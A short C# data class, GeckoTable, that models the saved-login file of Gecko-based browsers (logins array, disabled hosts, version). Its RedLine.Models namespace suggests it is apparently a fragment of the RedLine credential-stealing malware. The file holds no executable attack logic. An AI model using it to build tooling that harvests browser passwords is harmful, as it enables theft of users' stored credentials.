namespace RedLine.Models.Gecko
{
  public class GeckoTable
  {
    public int nextId { get; set; }

    public GeckoLogin[] logins { get; set; }

    public object[] disabledHosts { get; set; }

    public int version { get; set; }
  }
}
